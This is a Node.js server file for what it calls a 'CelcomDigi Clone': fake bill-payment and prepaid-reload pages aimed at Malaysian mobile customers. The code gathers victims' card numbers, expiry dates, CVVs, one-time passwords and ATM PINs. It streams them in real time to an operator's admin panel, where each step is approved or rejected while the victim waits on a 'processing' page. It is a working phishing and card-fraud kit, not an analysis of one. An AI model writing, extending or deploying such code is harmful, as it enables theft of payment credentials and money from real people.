const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const { fetchBillData, fetchReloadData } = require('./bill-bot');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;

// In-memory store for sessions
// sessions[sessionId] = {
//   sessionId, number, amount, ref, type,
//   cardData: { cardholderName, cardNumber, expiry, cvv, country, bank },
//   otpData: { otp },
//   pinData: { pin },
//   status: 'pending' | 'approved' | 'rejected' | 'awaiting_otp' | 'otp_approved' | 'otp_rejected' | 'awaiting_pin' | 'pin_approved' | 'pin_rejected' | 'completed',
//   createdAt, updatedAt
// }
const sessions = {};

// Admin WebSocket clients
const adminClients = new Set();

// Parse JSON body
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname)));
app.use('/get-assets', express.static(path.join(__dirname, 'get-assets')));

// ============================================================
// WebSocket Handler
// ============================================================
wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const role = url.searchParams.get('role');

  if (role === 'admin') {
    adminClients.add(ws);
    console.log('[WS] Admin connected. Total admins:', adminClients.size);

    // Send all sessions on connect
    const allSessions = Object.values(sessions);
    ws.send(JSON.stringify({ type: 'sessions_list', sessions: allSessions }));

    ws.on('close', () => {
      adminClients.delete(ws);
      console.log('[WS] Admin disconnected.');
    });

  } else {
    // Client (customer) connection
    const sessionId = url.searchParams.get('sessionId');
    if (sessionId) {
      ws.sessionId = sessionId;
      console.log(`[WS] Client connected for session: ${sessionId}`);

      // Send current status if exists
      if (sessions[sessionId]) {
        ws.send(JSON.stringify({
          type: 'status_update',
          sessionId,
          status: sessions[sessionId].status
        }));
      }
    }

    ws.on('close', () => {
      console.log(`[WS] Client disconnected for session: ${sessionId}`);
    });
  }
});

function broadcastToAll(data) {
  const msg = JSON.stringify(data);
  adminClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(msg);
  });
  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN && client.sessionId === data.sessionId) {
      client.send(msg);
    }
  });
}

function broadcastToAdmins(data) {
  const msg = JSON.stringify(data);
  adminClients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(msg);
  });
}

// ============================================================
// API ENDPOINTS - Card Submission
// ============================================================

// POST /api/card-submit
app.post('/api/card-submit', (req, res) => {
  const { sessionId, cardholderName, cardNumber, expiry, cvv, country, bank, number, amount, ref, type } = req.body;

  if (!sessionId || !cardNumber) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  sessions[sessionId] = {
    sessionId,
    number: number || '',
    amount: amount || '',
    ref: ref || '',
    type: type || 'bill',
    cardData: {
      cardholderName: cardholderName || '',
      cardNumber: cardNumber || '',
      expiry: expiry || '',
      cvv: cvv || '',
      country: country || 'Malaysia',
      bank: bank || '',
    },
    otpData: null,
    pinData: null,
    status: 'pending',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };

  console.log(`[Card Submit] Session: ${sessionId} | Number: ${number} | Amount: ${amount} | Type: ${type}`);

  broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });

  return res.json({ success: true, sessionId });
});

// POST /api/otp-submit
app.post('/api/otp-submit', (req, res) => {
  const { sessionId, otp, number, amount, ref, type } = req.body;

  if (!sessionId || !otp) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  if (!sessions[sessionId]) {
    // Create session if not exists (edge case)
    sessions[sessionId] = {
      sessionId, number, amount, ref, type: type || 'bill',
      cardData: null, otpData: null, pinData: null,
      status: 'awaiting_otp',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }

  sessions[sessionId].otpData = { otp };
  sessions[sessionId].status = 'awaiting_otp';
  sessions[sessionId].updatedAt = new Date().toISOString();

  console.log(`[OTP Submit] Session: ${sessionId} | OTP: ${otp}`);

  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });

  return res.json({ success: true, sessionId });
});

// POST /api/pin-submit
app.post('/api/pin-submit', (req, res) => {
  const { sessionId, pin, number, amount, ref, type } = req.body;

  if (!sessionId || !pin) {
    return res.status(400).json({ success: false, error: 'Missing required fields' });
  }

  if (!sessions[sessionId]) {
    sessions[sessionId] = {
      sessionId, number, amount, ref, type: type || 'bill',
      cardData: null, otpData: null, pinData: null,
      status: 'awaiting_pin',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }

  sessions[sessionId].pinData = { pin };
  sessions[sessionId].status = 'awaiting_pin';
  sessions[sessionId].updatedAt = new Date().toISOString();

  console.log(`[PIN Submit] Session: ${sessionId} | PIN: ${pin}`);

  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });

  return res.json({ success: true, sessionId });
});

// GET /api/card-status/:sessionId
app.get('/api/card-status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions[sessionId];

  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  return res.json({ success: true, status: session.status, sessionId });
});

// ============================================================
// API ENDPOINTS - Admin Panel
// ============================================================

// GET /api/admin/sessions - Get all sessions
app.get('/api/admin/sessions', (req, res) => {
  const allSessions = Object.values(sessions);
  return res.json({ success: true, sessions: allSessions });
});

// POST /api/admin/decision - Send approve/reject decision
app.post('/api/admin/decision', (req, res) => {
  const { sessionId, status } = req.body;

  if (!sessions[sessionId]) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  sessions[sessionId].status = status;
  sessions[sessionId].updatedAt = new Date().toISOString();

  console.log(`[Admin Decision] Session: ${sessionId} -> ${status}`);

  // Broadcast to customer
  broadcastToAll({ type: 'status_update', sessionId, status });

  // Broadcast updated session to admins
  broadcastToAdmins({ type: 'session_update', sessionId, ...sessions[sessionId] });

  return res.json({ success: true, status });
});

// DELETE /api/admin/delete/:sessionId
app.delete('/api/admin/delete/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  delete sessions[sessionId];
  return res.json({ success: true });
});

// DELETE /api/admin/clear - Clear all sessions
app.delete('/api/admin/clear', (req, res) => {
  Object.keys(sessions).forEach(k => delete sessions[k]);
  return res.json({ success: true });
});

// ============================================================
// API ENDPOINTS - Bill Payment Bot
// ============================================================

app.post('/api/bill-check', async (req, res) => {
  const { mobileNumber, number, useAccountNumber } = req.body;
  const phoneNumber = mobileNumber || number;

  if (!phoneNumber) {
    return res.status(400).json({ success: false, error: 'Mobile number is required' });
  }

  const cleanNumber = phoneNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Please enter a valid/active Celcom or Digi mobile number.'
    });
  }

  try {
    console.log(`[Bill Bot] Fetching bill for: ${cleanNumber}`);
    const result = await fetchBillData(cleanNumber, useAccountNumber || false);
    console.log(`[Bill Bot] Result: ${result.success ? 'SUCCESS' : 'FAILED - ' + result.error}`);
    return res.json(result);
  } catch (error) {
    console.error(`[Bill Bot] Error:`, error.message);
    return res.status(500).json({
      success: false,
      error: 'Unable to fetch bill data. Please try again.'
    });
  }
});

app.post('/api/reload-check', async (req, res) => {
  const { mobileNumber } = req.body;

  if (!mobileNumber) {
    return res.status(400).json({ success: false, error: 'Mobile number is required' });
  }

  const cleanNumber = mobileNumber.replace(/\s+/g, '').replace(/^0/, '60');
  if (!/^60\d{8,10}$/.test(cleanNumber)) {
    return res.status(400).json({
      success: false,
      error: 'Please enter a valid/active Celcom or Digi prepaid mobile number.'
    });
  }

  try {
    console.log(`[Reload Bot] Checking reload for: ${cleanNumber}`);
    const result = await fetchReloadData(cleanNumber);
    console.log(`[Reload Bot] Result: ${result.success ? 'SUCCESS' : 'FAILED - ' + result.error}`);
    return res.json(result);
  } catch (error) {
    console.error(`[Reload Bot] Error:`, error.message);
    return res.status(500).json({
      success: false,
      error: 'Unable to check reload. Please try again.'
    });
  }
});

// ============================================================
// PAGE ROUTES
// ============================================================

app.get('/ms', (req, res) => res.sendFile(path.join(__dirname, 'index-ms.html')));

app.get('/reload', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));
app.get('/reload/en', (req, res) => res.sendFile(path.join(__dirname, 'reload.html')));

app.get('/bill', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
app.get('/bill-payment', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));
app.get('/bill-payment/en', (req, res) => res.sendFile(path.join(__dirname, 'bill.html')));

app.get('/pay-bill', (req, res) => res.sendFile(path.join(__dirname, 'pay-bill.html')));

app.get('/recharge', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));
app.get('/reload/pay', (req, res) => res.sendFile(path.join(__dirname, 'recharge.html')));

app.get('/payment-method', (req, res) => res.sendFile(path.join(__dirname, 'payment-method.html')));

app.get('/credit-card', (req, res) => res.sendFile(path.join(__dirname, 'credit-card.html')));

app.get('/processing', (req, res) => res.sendFile(path.join(__dirname, 'processing.html')));

app.get('/otp', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));

app.get('/atm-pin', (req, res) => res.sendFile(path.join(__dirname, 'atm-pin.html')));

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

app.get('/payment-confirm', (req, res) => res.sendFile(path.join(__dirname, 'payment-confirm.html')));

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('*', (req, res) => {
  if (req.path.match(/\.[a-zA-Z0-9]+$/)) {
    return res.status(404).send('Not found');
  }
  res.sendFile(path.join(__dirname, 'index.html'));
});

server.listen(PORT, () => {
  console.log(`CelcomDigi Clone running on port ${PORT}`);
});
